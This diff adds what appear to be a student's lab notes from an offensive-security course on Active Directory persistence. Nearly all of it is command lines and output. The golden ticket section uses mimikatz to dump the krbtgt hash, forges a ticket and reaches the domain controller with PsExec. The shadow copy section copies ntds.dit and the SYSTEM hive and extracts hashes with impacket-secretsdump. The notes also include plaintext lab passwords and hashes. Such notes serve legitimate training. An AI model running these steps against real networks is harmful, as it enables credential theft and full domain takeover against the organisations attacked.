@@ -1,0 +1,76 @@
+Lateral Movement in Active Directory
+
+Active Directory Persistence
+
+Golden Ticket
+
+krbtgt
+
+attacker 192.168.49.54
+dc1 192.168.54.70
+client74 192.168.54.74
+CORP\jen:Nexus123!
+
+xfreerdp /v:192.168.54.70 /d:CORP /u:jeffadmin /p:BrouhahaTungPerorateBroom2023!
+
+c:\tools\mimikatz.exe
+privilege::debug
+lsadump::lsa /patch
+
+Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
+User : krbtgt
+NTLM : 1693c6cefafffc7af11ef34d1c788f47
+
+xfreerdp /v:192.168.54.74 /d:CORP /u:jen /p:Nexus123!
+
+c:\tools\mimikatz.exe
+kerberos::purge
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+(reuse sid and krbtgt hash from courseware)
+
+Golden ticket for 'jen @ corp.com' successfully submitted for current session
+
+misc::cmd
+
+C:\Tools\SysinternalsSuite
+PsExec.exe \\dc1 cmd.exe
+ipconfig
+whoami /groups
+
+CORP\Domain Admins   
+
+c:\users\administrator\desktop\flag.txt
+OS{d56e5c35ae38f1b9c5d0acd14b51630c}
+
+--------
+Shadow Copies
+
+dc1 192.168.54.70
+CORP\jeffadmin:BrouhahaTungPerorateBroom2023!
+
+xfreerdp /v:192.168.54.70 /d:CORP /u:jeffadmin /p:BrouhahaTungPerorateBroom2023!
+
+c:\tools
+vshadow.exe -nw -p  C:
+
+Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+(designated name for the source location from which the ntds.dit is copied)
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak
+
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+Administrator:500:{hash}
+
+
+
+
+
+
+
+
+
+
+
+
+
